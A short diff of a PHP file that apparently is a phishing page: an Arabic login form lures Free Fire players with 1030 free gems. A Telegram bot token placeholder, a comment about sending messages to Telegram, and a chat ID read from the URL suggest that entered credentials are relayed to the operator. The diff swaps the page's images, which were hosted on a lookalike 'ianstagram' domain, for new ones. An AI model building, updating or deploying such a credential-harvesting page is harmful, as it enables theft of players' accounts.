@@ -1,5 +1,5 @@
 <?php
-// توكن البوت الخاص بك
+// توكن البوت الخاص بك (تم تحديثه)
 $botToken = "BBOTTTTTTTTTTT";
 
 // دالة لإرسال الرسائل إلى التليجرام
@@ -78,7 +78,7 @@ $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
         }
         
         body {
-            background: url('https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_125607_Google.jpg') no-repeat center center fixed;
+            background: url('https://i.ibb.co/ksMZ3WG3/Screenshot-20260411-002237-Google.jpg') no-repeat center center fixed;
             background-size: cover;
             display: flex;
             justify-content: center;
@@ -374,7 +374,8 @@ $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
         
         <div class="login-form">
             <div class="logo-container">
-                <img src="https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_125456_Google.jpg" alt="Free Fire Logo">
+                <!-- الشعار الجديد -->
+                <img src="https://i.ibb.co/4RPGpHN0/Screenshot-20260411-002259-Google.jpg" alt="Free Fire Logo">
                 <p>سجل الدخول إلى حسابك للوصول إلى عالم Free Fire واربح 1030 جوهرة مجانًا</p>
             </div>
             
